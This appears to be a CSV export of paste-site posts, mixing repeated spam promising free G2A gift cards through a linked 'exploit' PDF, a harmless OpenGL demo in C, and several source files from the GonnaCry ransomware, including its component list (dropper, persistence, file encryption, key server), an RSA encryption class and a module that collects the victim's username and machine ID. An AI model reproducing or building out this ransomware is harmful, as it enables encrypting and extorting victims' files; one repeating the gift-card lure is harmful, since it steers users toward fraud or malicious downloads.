id,title,username,language,date,content
ecs8wVuB,🤑G2A.com Free Gift Card FIX June 2024🎁,PAUL-A8,JavaScript,Wednesday 26th of June 2024 01:02:08 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any item for free on G2A.com including Steam gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
biYEfzks,GonnaCry Files List,FlyFar,6502 Kick Assembler,Wednesday 26th of June 2024 12:57:28 AM CDT,"main.py: GonnaCry start file
daemon.py:	dropped by main.py and run
dropper.py	drop the malware on the computer
decryptor.py	communicate with the server, decrypt keys and files
symmetric.py	AES encryption
asymmetric.py	RSA encryption
generate_keys.py	Generate random AES keys
persistence.py	Persistence routines for Linux OS
get_files.py	Find files to be encrypted
environment.py	environment variables
variables.py	Images and malware binaries
utils.py	Utilities routines"
uAbWqqHt,src/GonnaCry/asymmetric.py,FlyFar,Python,Wednesday 26th of June 2024 12:56:16 AM CDT,"#!/bin/bash/env python
# coding=UTF-8
import os
from os import chmod
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP

class assymetric():
    # Constructor
    def __init__(self):
        self.private_key_path = """"
        self.public_key_path = """"
        self.bit_len = 2048
        self.private_key_PEM = None
        self.public_key_PEM = None
        self.key = None


    def generate_keys(self):
        self.key = RSA.generate(self.bit_len)
        self.private_key_PEM = self.key.exportKey('OpenSSH')
        self.public_key_PEM = self.key.publickey().exportKey('OpenSSH')
        
    
    def encrypt(self, data):
        cipher = PKCS1_OAEP.new(self.key)
        return cipher.encrypt(data)


    def decrypt(self, data):
        cipher = PKCS1_OAEP.new(self.key)
        return cipher.decrypt(data)

    
    def save_to_file(self, path):
        self.private_key_path = os.path.join(path, ""priv.key"")
        self.public_key_path = os.path.join(path, ""public.key"")

        with open(self.private_key_path, 'w') as content_file:
            chmod(self.private_key_path, 600) # -rw------- permissions 
            content_file.write(self.private_key_PEM)

        with open(self.public_key_path, 'w') as content_file:
            content_file.write(self.public_key_PEM)


if __name__ == ""__main__"":
    cipher = assymetric()
    cipher.generate_keys()
    print(cipher.private_key_PEM)
    print(cipher.public_key_PEM)"
Ggbp2qcE,🤑G2A.com Free Gift Card FIX June 2024🤑,Kevin_Chen1,JavaScript,Wednesday 26th of June 2024 12:56:06 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any item for free on G2A.com including Playstation gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
RFkbRb3m,🤑G2A.com Free Gift Card FIX June 2024🤑,mano03,JavaScript,Wednesday 26th of June 2024 12:50:03 AM CDT,"G2A.com complimentary voucher & games guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
JxWyfdCe,src/GonnaCry/clean.sh,FlyFar,Bash,Wednesday 26th of June 2024 12:49:38 AM CDT,"#!/bin/bash
rm *.pyc
rm -rf __pycache__"
ESFiGuZH,🎁 G2A.COM FREE GIFT CARD GUIDE JUN 2024 V2 🎁,jusst2k4,GetText,Wednesday 26th of June 2024 12:46:23 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_882996.pdf
 
Working as of:
26 June 2024"
yp2c91yx,🤑G2A.com Free Gift Card FIX June 2024🤑,gigi1964,JavaScript,Wednesday 26th of June 2024 12:44:00 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Amazon gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
d1SUezt4,Untitled,Tkap1,C,Wednesday 26th of June 2024 12:43:59 AM CDT,"// compile with
// cl.exe -nologo main.c -link opengl32.lib user32.lib gdi32.lib && main.exe

#include <Windows.h>
#include <GL/GL.h>

LRESULT window_proc(HWND window, UINT msg, WPARAM wparam, LPARAM lparam)
{
	LRESULT result = 0;
	switch(msg) {
		case WM_CLOSE:
		case WM_DESTROY: {
			PostQuitMessage(0);
		} break;

		default: { result = DefWindowProc(window, msg, wparam, lparam); }

	}
	return result;
}

int main()
{
	WNDCLASSEX c = {0};
	c.cbSize = sizeof(c);
	c.lpfnWndProc = window_proc;
	c.style = CS_OWNDC | CS_VREDRAW | CS_HREDRAW;
	c.lpszClassName = ""hi youtube"";
	c.hInstance = GetModuleHandle(NULL);
	RegisterClassEx(&c);

	HWND window = CreateWindow(""hi youtube"", ""subscribe"", WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, GetModuleHandle(NULL), NULL);
	HDC dc = GetDC(window);
	PIXELFORMATDESCRIPTOR pfd = {0};
	pfd.nSize = sizeof(pfd);
	pfd.nVersion = 1;
	pfd.dwFlags = PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL | PFD_DOUBLEBUFFER;
	pfd.cColorBits = 32;
	pfd.cAlphaBits = 8;
	pfd.cDepthBits = 24;
	int format = ChoosePixelFormat(dc, &pfd);
	SetPixelFormat(dc, format, &pfd);
	HGLRC glrc = wglCreateContext(dc);
	wglMakeCurrent(dc, glrc);
	MSG msg;
	while(1) {
		while(PeekMessage(&msg, NULL, 0, 0, PM_REMOVE) > 0) {
			if(msg.message == WM_QUIT) { return 0; }
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		glClearColor(0.1f, 0, 0, 0);
		glClear(GL_COLOR_BUFFER_BIT);


		glBegin(GL_TRIANGLES);
		glColor3f(1, 0, 0);
		glVertex2f(0, 0.5f);
		glColor3f(0, 1, 0);
		glVertex2f(-0.25f, -0.5f);
		glColor3f(0, 0, 1);
		glVertex2f(0.25f, -0.5f);
		glEnd();
		SwapBuffers(dc);
	}
	return 0;
}"
Eak8sxY5,src/GonnaCry/environment.py,FlyFar,Python,Wednesday 26th of June 2024 12:42:19 AM CDT,"import os
import pwd

def get_desktop_path():
    caminho = os.path.join(os.path.expanduser('~'), '/Desktop/')
    caminho2 = os.path.join(os.path.expanduser('~'), '/Área\\ de\\ Trabalho/')
    if(os.path.isdir(caminho)):
        path = caminho
    elif(os.path.isdir(caminho2)):
        path = caminho2
    else:
        path = os.path.expanduser('~') + '/Desktop/'
    
    return path


def get_username():
    return pwd.getpwuid(os.getuid())[0]


def get_unique_machine_id():
    with open(""/etc/machine-id"") as f :
        id = f.read()
        if('\n' in id):
            id = id.replace('\n', '')
    
    return id


def get_home_path():
    return os.path.expanduser('~')"
